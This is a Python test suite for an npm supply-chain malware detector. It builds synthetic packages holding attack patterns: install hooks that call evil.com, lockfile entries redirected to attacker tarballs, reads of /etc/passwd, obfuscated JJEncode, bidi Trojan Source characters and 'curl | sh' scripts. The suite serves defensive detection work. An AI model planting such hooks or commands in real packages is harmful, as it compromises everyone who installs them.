#!/usr/bin/env python3
"""
scripts/test_detector_upgrades.py
Unit and regression test suite covering all OSS-derived multi-layer upgrades
and benign false-positive controls.
"""

import base64
import hashlib
import io
import json
import os
import sys
import tarfile

import pytest

_SCRIPTS_DIR = os.path.dirname(os.path.abspath(__file__))
if _SCRIPTS_DIR not in sys.path:
    sys.path.insert(0, _SCRIPTS_DIR)

from detector import SupplyChainDetector  # noqa: E402
from detector_core.layer2_source import analyze_decode_eval_flows, inspect_encoded_strings  # noqa: E402
from detector_core.layer3_sandbox import get_node_permission_flags, run_node_sandbox  # noqa: E402


def _make_pkg(tmp_path, name="test-pkg", version="1.0.0", scripts=None, files=None, extra_manifest=None):
    pkg_dir = tmp_path / name.replace("/", "_")
    pkg_dir.mkdir(parents=True, exist_ok=True)
    manifest = {
        "name": name,
        "version": version,
        "description": "Unit test package",
        "main": "index.js",
        "license": "MIT",
    }
    if scripts is not None:
        manifest["scripts"] = scripts
    if extra_manifest:
        manifest.update(extra_manifest)
    (pkg_dir / "package.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    for rel, content in (files or {"index.js": "module.exports = {};"}).items():
        fp = pkg_dir / rel
        fp.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(content, bytes):
            fp.write_bytes(content)
        else:
            fp.write_text(content, encoding="utf-8")
    return str(pkg_dir)


def _valid_sha512(data: bytes = b"dummy") -> str:
    return "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode("ascii")


def _static_detector() -> SupplyChainDetector:
    det = SupplyChainDetector(enable_whitelist=True, risk_threshold=35)
    det.analyze_behavioral_sandbox = lambda *args, **kwargs: (0, [])  # type: ignore[method-assign]
    return det


def test_decode_eval_vm_without_eval_no_unbound_error():
    code = "const v = Buffer.from('aGVsbG8=', 'base64');\nvm.runInNewContext(v.toString());"
    linked_eval, risky_vm = analyze_decode_eval_flows(code, has_net_sink=False, has_hook_context=False)
    assert linked_eval is False
    assert risky_vm is True


def test_evasion_t4_var_concat_static(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        name="t4-concat",
        files={
            "index.js": (
                "const a = 'child_';\nconst b = 'process';\n"
                "require(a + b).execSync('ec' + 'ho EVASION_' + 'MARKER');\nmodule.exports = {};"
            )
        },
    )
    res = _static_detector().scan_package(pkg)
    assert res["verdict"] == "MALICIOUS"
    assert res["layer_scores"]["layer_2_source"] >= 35


def test_evasion_t6_array_join_static(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        name="t6-array",
        files={
            "index.js": (
                "const cp = require(['child', 'process'].join('_'));\n"
                "cp.execSync(['echo', 'EVASION_MARKER'].join(' '));\nmodule.exports = {};"
            )
        },
    )
    res = _static_detector().scan_package(pkg)
    assert res["verdict"] == "MALICIOUS"
    assert res["layer_scores"]["layer_2_source"] >= 35


def test_evasion_t0n_toplevel_and_b5_benign_controls(tmp_path):
    mal = _make_pkg(
        tmp_path,
        name="t0n-pkg",
        files={"index.js": "require('child_process').execSync('echo MARKER');\nmodule.exports = {};"},
    )
    res_mal = _static_detector().scan_package(mal)
    assert res_mal["verdict"] == "MALICIOUS"

    ben_b5 = _make_pkg(
        tmp_path,
        name="b5-helper",
        files={
            "index.js": (
                "const { execSync } = require('child_process');\n"
                "module.exports = { gitVersion: () => execSync('git --version').toString() };"
            )
        },
    )
    assert _static_detector().scan_package(ben_b5)["verdict"] == "BENIGN"

    ben_b4 = _make_pkg(
        tmp_path,
        name="b4-dyn-plugin",
        files={
            "index.js": "module.exports = { load: (n) => require('./plugins/' + n) };",
            "plugins/default.js": "module.exports = { ok: true };",
        },
    )
    assert _static_detector().scan_package(ben_b4)["verdict"] == "BENIGN"

    ben_cli = _make_pkg(
        tmp_path,
        name="ben-cli-bin",
        extra_manifest={"bin": {"mytool": "./cli.js"}},
        files={"index.js": "module.exports = {};", "cli.js": "#!/usr/bin/env node\nrequire('child_process').execSync('echo ok');"},
    )
    assert _static_detector().scan_package(ben_cli)["verdict"] == "BENIGN"


def test_evasion_t7n_delayed_timer_and_benign_timer(tmp_path):
    mal = _make_pkg(
        tmp_path,
        name="t7n-timer",
        files={"index.js": "setTimeout(function () { require('child_process').execSync('echo EVASION'); }, 60000);"},
    )
    assert _static_detector().scan_package(mal)["verdict"] == "MALICIOUS"

    ben = _make_pkg(
        tmp_path,
        name="ben-timer",
        files={"index.js": "setTimeout(() => { console.log('tick'); }, 60000);\nmodule.exports = {};"},
    )
    assert _static_detector().scan_package(ben)["verdict"] == "BENIGN"


def test_silent_spawn_trojan_jjencode_padding_and_minified_sdk_fp_guard(tmp_path):
    silent = _make_pkg(
        tmp_path,
        name="silent-spawn",
        files={"index.js": "const { spawn } = require('child_process');\nfunction run(){ spawn('node', ['-e', '1'], { detached: true, stdio: 'ignore' }); }"},
    )
    assert _static_detector().scan_package(silent)["verdict"] == "MALICIOUS"

    trojan = _make_pkg(
        tmp_path,
        name="trojan-bidi",
        files={"index.js": "const accessLevel = 'user';\n// \u202e evil\nmodule.exports = {};"},
    )
    assert _static_detector().scan_package(trojan)["verdict"] == "MALICIOUS"

    padded = _make_pkg(
        tmp_path,
        name="pad-exec",
        files={"index.js": "module.exports = 1;" + (" " * 420) + "eval('1+1');"},
    )
    assert _static_detector().scan_package(padded)["verdict"] == "MALICIOUS"

    # JJEncode symbol-only identifiers (>80% $_) + self-defending check
    jj_body = (
        "$=~[];$={___:++$,$$$$:(![]+'')[$],__$:++$,$_$_:(![]+'')[$],_$_:++$,$_$$:({}+'')[$]};"
        "$.$_=($.$=$+'')[$._$]+($._$=$.$_[$.__$])+($.$$=($.$+'')[$.__$])+((!$)+'')[$._$_]+($.__=$.$_[$.__$]);"
        "$.$$=$._+($.__)[$._$]+$._+$.$;$.$=($.___)[$.$_][$.$_];"
        "if (globalThis.v8debug) process.exit(0);"
    )
    jj_pkg = _make_pkg(
        tmp_path,
        name="jjencode-pkg",
        files={"index.js": jj_body},
    )
    res_jj = _static_detector().scan_package(jj_pkg)
    assert res_jj["verdict"] == "MALICIOUS"

    # Hex-only non-FP + minified SDK Base64 non-FP (neroom-node-sdk pattern)
    hex_ben = "const h = 'deadbeefcafebabe0123456789abcdefdeadbeef';"
    assert inspect_encoded_strings(hex_ben, is_minified=False)[0] is False

    sdk_worker = "self.onmessage=function(){fetch('https://example.com');new WebSocket('wss://example.com');};"
    sdk_b64 = base64.b64encode(sdk_worker.encode()).decode()
    minified_bundle = ("var a=1;" * 400) + f"const w=Buffer.from('{sdk_b64}','base64').toString();"
    assert inspect_encoded_strings(minified_bundle, has_url_risk_context=True, is_minified=True)[0] is False


def test_layer1a_install_config_disguised_binary_build_and_metadata(tmp_path):
    pnpm_pkg = _make_pkg(
        tmp_path,
        name="pnpm-hook-bad",
        files={
            "index.js": "module.exports = {};",
            ".pnpmfile.cjs": "module.exports = { hooks: { readPackage(pkg) { pkg.scripts.postinstall = 'curl evil.com'; return pkg; } } };",
        },
    )
    assert _static_detector().scan_package(pnpm_pkg)["verdict"] == "MALICIOUS"

    yarn_pkg = _make_pkg(
        tmp_path,
        name="yarnrc-bad",
        files={
            "index.js": "module.exports = {};",
            ".yarnrc.yml": "plugins:\n  - path: .yarn/plugins/p.cjs\n    spec: https://evil.example/plugin.js\n",
        },
    )
    assert _static_detector().scan_package(yarn_pkg)["verdict"] == "MALICIOUS"

    bun_pkg = _make_pkg(
        tmp_path,
        name="bunfig-bad",
        files={"index.js": "module.exports = {};", "bunfig.toml": 'preload = ["./evil.js"]\n'},
    )
    assert _static_detector().scan_package(bun_pkg)["verdict"] == "MALICIOUS"

    elf_disguised = _make_pkg(
        tmp_path,
        name="elf-js",
        files={"index.js": "module.exports = {};", "helper.js": b"\x7fELF" + b"\x00" * 128},
    )
    assert _static_detector().scan_package(elf_disguised)["verdict"] == "MALICIOUS"

    gyp_flags = _make_pkg(
        tmp_path,
        name="gyp-curl-flag",
        scripts={"install": "node-gyp rebuild"},
        files={"index.js": "module.exports = {};", "binding.gyp": "{'targets':[{'target_name':'a','libraries':['-lcurl']}]}"},
    )
    assert _static_detector().scan_package(gyp_flags)["verdict"] == "MALICIOUS"

    alt_rt = _make_pkg(
        tmp_path,
        name="bun-rt-bad",
        scripts={"postinstall": "bun -e \"require('fs').readFileSync('/etc/passwd')\""},
    )
    assert _static_detector().scan_package(alt_rt)["verdict"] == "MALICIOUS"

    corp_meta = _make_pkg(
        tmp_path,
        name="corp-meta",
        version="9.9.9",
        extra_manifest={"repository": "https://git.internal/team/repo"},
        files={"index.js": "module.exports = {};"},
    )
    res_meta = _static_detector().scan_package(corp_meta)
    assert any(f["rule"] == "Spoofed Internal Metadata URL" for f in res_meta["findings"])
    assert res_meta["verdict"] == "MALICIOUS"


def test_layer1b_lockfile_hardening_and_multi_lockfile(tmp_path):
    valid_int = _valid_sha512()

    # 1. Package substitution in package-lock.json
    sub_pkg = _make_pkg(
        tmp_path,
        name="lock-sub",
        files={
            "index.js": "module.exports = {};",
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {
                    "node_modules/lodash": {
                        "version": "4.17.21",
                        "resolved": "https://registry.npmjs.org/lodash/../evil/-/evil-1.0.0.tgz",
                        "integrity": valid_int,
                    }
                },
            }),
        },
    )
    res_sub = _static_detector().scan_package(sub_pkg)
    assert res_sub["verdict"] == "MALICIOUS"
    assert any(f["rule"] == "Lockfile Package Substitution Attack" for f in res_sub["findings"])

    # 2. Weak sha1 + HTTPS downgrade
    weak_pkg = _make_pkg(
        tmp_path,
        name="lock-weak",
        files={
            "index.js": "module.exports = {};",
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {
                    "node_modules/chalk": {
                        "version": "5.3.0",
                        "resolved": "http://registry.npmjs.org/chalk/-/chalk-5.3.0.tgz",
                        "integrity": "sha1-AAAAAAAAAAAAAAAAAAAAAAAAAAA=",
                    }
                },
            }),
        },
    )
    res_weak = _static_detector().scan_package(weak_pkg)
    assert res_weak["verdict"] == "MALICIOUS"
    rules_weak = {f["rule"] for f in res_weak["findings"]}
    assert "Lockfile Insecure HTTP Resolved URL" in rules_weak
    assert "Lockfile Integrity Missing / Downgraded" in rules_weak

    # 3. Forged inBundle flag
    forged_pkg = _make_pkg(
        tmp_path,
        name="lock-forged-bundle",
        files={
            "index.js": "module.exports = {};",
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {
                    "node_modules/evil-pkg": {"version": "1.0.0", "inBundle": True}
                },
            }),
        },
    )
    res_forged = _static_detector().scan_package(forged_pkg)
    assert any(f["rule"] == "Forged Lockfile Bundle Flag" for f in res_forged["findings"])

    # 4. Clean lockfile with local Verdaccio + valid SHA512 must remain BENIGN
    clean_lock = _make_pkg(
        tmp_path,
        name="lock-clean",
        files={
            "index.js": "module.exports = {};",
            "package-lock.json": json.dumps({
                "lockfileVersion": 3,
                "packages": {
                    "node_modules/lodash": {
                        "version": "4.17.21",
                        "resolved": "https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz",
                        "integrity": valid_int,
                    }
                },
            }),
        },
    )
    assert _static_detector().scan_package(clean_lock)["verdict"] == "BENIGN"

    # 5. yarn.lock & pnpm-lock.yaml detection
    yarn_bad = _make_pkg(
        tmp_path,
        name="yarn-bad",
        files={
            "index.js": "module.exports = {};",
            "yarn.lock": (
                "lodash@^4.17.21:\n"
                '  version "4.17.21"\n'
                '  resolved "http://evil-cdn.example.com/lodash-4.17.21.tgz"\n'
                f'  integrity {valid_int}\n'
            ),
        },
    )
    res_yarn = _static_detector().scan_package(yarn_bad)
    assert res_yarn["verdict"] == "MALICIOUS"
    assert "yarn.lock" in res_yarn["dependency_graph"]["lockfile_types"]

    pnpm_bad = _make_pkg(
        tmp_path,
        name="pnpm-bad",
        files={
            "index.js": "module.exports = {};",
            "pnpm-lock.yaml": (
                "lockfileVersion: '9.0'\n"
                "packages:\n"
                "  /lodash@4.17.21:\n"
                "    resolution:\n"
                "      tarball: http://198.51.100.5/evil.tgz\n"
                f"      integrity: {valid_int}\n"
            ),
        },
    )
    res_pnpm = _static_detector().scan_package(pnpm_bad)
    assert res_pnpm["verdict"] == "MALICIOUS"
    assert "pnpm-lock.yaml" in res_pnpm["dependency_graph"]["lockfile_types"]


def test_offline_version_diff(tmp_path):
    base = _make_pkg(
        tmp_path,
        name="diff-base",
        version="1.0.0",
        extra_manifest={"dist": {"attestations": {"url": "https://registry.npmjs.org/-/npm/v1/attestations/foo@1.0.0"}}},
        files={"index.js": "module.exports = { add: (a, b) => a + b };"},
    )
    clean_v2 = _make_pkg(
        tmp_path,
        name="diff-clean-v2",
        version="1.0.1",
        extra_manifest={"dist": {"attestations": {"url": "https://registry.npmjs.org/-/npm/v1/attestations/foo@1.0.1"}}},
        files={"index.js": "module.exports = { add: (a, b) => Number(a) + Number(b) };"},
    )
    res_clean = _static_detector().scan_package(clean_v2, baseline_path=base)
    assert res_clean["verdict"] == "BENIGN"
    assert res_clean["layer_scores"]["layer_1_version_diff"] == 0

    evil_v2 = _make_pkg(
        tmp_path,
        name="diff-evil-v2",
        version="1.0.1",
        scripts={"postinstall": "node index.js"},
        files={
            "index.js": (
                "const cp = require('child_process');\n"
                "const https = require('https');\n"
                "function send(){ cp.execSync('whoami'); https.request('https://example.org'); }\n"
                "module.exports = {};"
            )
        },
    )
    res_evil = _static_detector().scan_package(evil_v2, baseline_path=base)
    assert res_evil["verdict"] == "MALICIOUS"
    assert res_evil["layer_scores"]["layer_1_version_diff"] >= 65
    diff_rules = {f["rule"] for f in res_evil["findings"]}
    assert "Version Diff: New Lifecycle Hook Introduced" in diff_rules
    assert "Version Diff: Provenance Attestation Dropped" in diff_rules
    assert "Version Diff: Escalated Code Capabilities" in diff_rules


def test_layer3_es6_class_fuzzing_and_scoped_fs_read(tmp_path):
    outside_secret = tmp_path / "outside_host_secret.txt"
    outside_secret.write_text("SECRET_OUTSIDE_SANDBOX", encoding="utf-8")

    # Package exports ES6 class calling dangerous shell/recon method when instantiated during export_fuzz
    pkg = _make_pkg(
        tmp_path,
        name="l3-class-pkg",
        files={
            "index.js": (
                "class Helper {\n"
                "  run() { require('child_process').execSync('whoami && cat /etc/passwd'); }\n"
                "}\n"
                "module.exports = Helper;"
            )
        },
    )
    det = SupplyChainDetector(enable_whitelist=True, risk_threshold=35)
    res = det.scan_package(pkg)
    assert res["verdict"] == "MALICIOUS"
    assert res["layer_scores"]["layer_3_behavioral"] >= 45
    assert res["behavioral_summary"]["phases"]["export_fuzz"] >= 1
    assert res["behavioral_summary"]["axes"]["commands"]

    # Benign ES6 class calling safe command in method must remain BENIGN in Layer 3
    pkg_safe_cls = _make_pkg(
        tmp_path,
        name="l3-safe-class",
        files={
            "index.js": (
                "class GitTool {\n"
                "  ver() { return require('child_process').execSync('git --version').toString(); }\n"
                "}\n"
                "module.exports = GitTool;"
            )
        },
    )
    assert SupplyChainDetector(enable_whitelist=True, risk_threshold=35).scan_package(pkg_safe_cls)["verdict"] == "BENIGN"

    # Verify Node scoped permission flags exclude outside_secret directory
    runner = os.path.join(_SCRIPTS_DIR, "sandbox_runner.js")
    import subprocess
    flags = get_node_permission_flags(subprocess, allowed_read_paths=[_SCRIPTS_DIR, pkg])
    if len(flags) >= 2 and flags[1] in ("--permission", "--experimental-permission"):
        assert "--allow-fs-read=*" not in flags
        proc = subprocess.run(
            ["node"] + flags + ["-e", f"require('fs').readFileSync({json.dumps(str(outside_secret))})"],
            capture_output=True,
            text=True,
        )
        assert proc.returncode != 0
        assert "ERR_ACCESS_DENIED" in proc.stderr


def test_layer3_relative_path_inside_pkg_dir_allowed(tmp_path):
    pkg = _make_pkg(
        tmp_path,
        name="l3-rel-fs",
        scripts={"postinstall": 'node -e "const fs = require(\'fs\'); fs.existsSync(\'./package.json\');"'},
        files={"index.js": "const fs = require('fs'); fs.existsSync('./package.json'); module.exports = {};"},
    )
    det = SupplyChainDetector(enable_whitelist=True, risk_threshold=35)
    res = det.scan_package(pkg)
    assert res["layer_scores"]["layer_3_behavioral"] == 0
    assert res["verdict"] == "BENIGN"
    assert not any(f["rule"] == "Sleep / Delay / Sandbox Evasion Detected" for f in res["findings"])


def test_trojan_source_ui_emoji_zwj_benign_vs_unbalanced_bidi(tmp_path):
    zwj_ui = "const emojis = [" + ",".join(f"'👩\\u200D💻{i}'" for i in range(15)) + "];\nmodule.exports = emojis;"
    zwj_raw = "const emojis = [" + ",".join(f"'👩\u200D💻{i}'" for i in range(15)) + "];\nmodule.exports = emojis;"
    ben_zwj = _make_pkg(tmp_path, name="ui-emoji-zwj", files={"index.js": zwj_raw + "\n// " + ("\u200b" * 10) + "\n" + zwj_ui})
    res_zwj = _static_detector().scan_package(ben_zwj)
    assert res_zwj["verdict"] == "BENIGN"
    assert not any(f["rule"] == "Trojan Source / Hidden Unicode Attack" for f in res_zwj["findings"])

    # Minified UI/i18n bundle with embedded RTL Bidi string literals stays BENIGN
    rtl_bundle = ("var a=1;" * 420) + "var rtl='\u202Ahello\u202C';module.exports={rtl};"
    ben_rtl_min = _make_pkg(tmp_path, name="i18n-min-rtl", files={"dist/bundle.min.js": rtl_bundle})
    assert _static_detector().scan_package(ben_rtl_min)["verdict"] == "BENIGN"

    # Unbalanced Bidi comment stays MALICIOUS
    mal_bidi = _make_pkg(tmp_path, name="bidi-comment-mal", files={"index.js": "const ok = true;\n// \u202e hidden"})
    res_bidi = _static_detector().scan_package(mal_bidi)
    assert res_bidi["verdict"] == "MALICIOUS"
    assert any(f["rule"] == "Trojan Source / Hidden Unicode Attack" for f in res_bidi["findings"])


def test_minified_bundle_obfuscation_not_self_corroborated(tmp_path):
    # Mimics large commercial minified SDKs (CKEditor/AnyChart) having fetch + Function + _0x tokens
    obf_vars = ";".join(f"var _0x{1000 + i:04x}={i}" for i in range(8))
    bundle = ("var x=1;" * 450) + obf_vars + ";function g(){return new Function('return 1');}fetch('https://example.com');"
    ben_bundle = _make_pkg(tmp_path, name="commercial-min-sdk", files={"dist/sdk.min.js": bundle})
    res = _static_detector().scan_package(ben_bundle)
    assert res["verdict"] == "BENIGN"
    assert res["layer_scores"]["layer_2_source"] == 0


def test_minor_calver_vs_dependency_confusion(tmp_path):
    ben_calver = _make_pkg(
        tmp_path,
        name="workerd-calver",
        version="1.20261125.1",
        files={"index.js": "module.exports = {};"},
    )
    res_cal = _static_detector().scan_package(ben_calver)
    assert res_cal["verdict"] == "BENIGN"
    assert not any(f["rule"] == "Dependency Confusion Indicator" for f in res_cal["findings"])

    mal_high_minor = _make_pkg(
        tmp_path,
        name="bad-minor-depconf",
        version="1.9999.0",
        files={"index.js": "module.exports = {};"},
    )
    assert _static_detector().scan_package(mal_high_minor)["verdict"] == "MALICIOUS"


def test_non_shell_execfile_in_install_vs_shell_exec_and_unref_aux(tmp_path):
    ben_cli_inst = _make_pkg(
        tmp_path,
        name="cli-execfile-inst",
        scripts={"postinstall": "node install.js"},
        files={
            "index.js": "module.exports = {};",
            "install.js": (
                "const { execFileSync } = require('child_process');\n"
                "function verify(binPath) { return execFileSync(binPath, ['--version']); }\n"
                "module.exports = { verify };"
            ),
        },
    )
    res_cli = _static_detector().scan_package(ben_cli_inst)
    assert res_cli["verdict"] == "BENIGN"
    assert res_cli["risk_score"] == 30

    # Top-level non-shell execFileSync inside install.js (esbuild/wasm-pack pattern) must also stay BENIGN (30 < 35)
    ben_cli_top = _make_pkg(
        tmp_path,
        name="cli-execfile-top",
        scripts={"postinstall": "node install.js"},
        files={
            "index.js": "module.exports = {};",
            "install.js": (
                "const { execFileSync } = require('child_process');\n"
                "execFileSync(process.execPath, ['-v']);\n"
            ),
        },
    )
    res_cli_top = _static_detector().scan_package(ben_cli_top)
    assert res_cli_top["verdict"] == "BENIGN"
    assert res_cli_top["risk_score"] == 30

    mal_shell_inst = _make_pkg(
        tmp_path,
        name="shell-exec-inst",
        scripts={"postinstall": "node install.js"},
        files={
            "index.js": "module.exports = {};",
            "install.js": "const { execSync } = require('child_process');\nexecSync('echo EVASION');",
        },
    )
    assert _static_detector().scan_package(mal_shell_inst)["verdict"] == "MALICIOUS"

    # Unreferenced aux .sh should NOT self-convict at thr=35 (weak_score=20), whereas referenced aux .sh stays MALICIOUS
    ben_unref_sh = _make_pkg(
        tmp_path,
        name="unref-sh-pkg",
        files={"index.js": "module.exports = {};", "scripts/dev.sh": "curl -sSL https://example.com/install.sh | sh\n"},
    )
    res_sh = _static_detector().scan_package(ben_unref_sh)
    assert res_sh["verdict"] == "BENIGN"
    assert res_sh["risk_score"] == 20
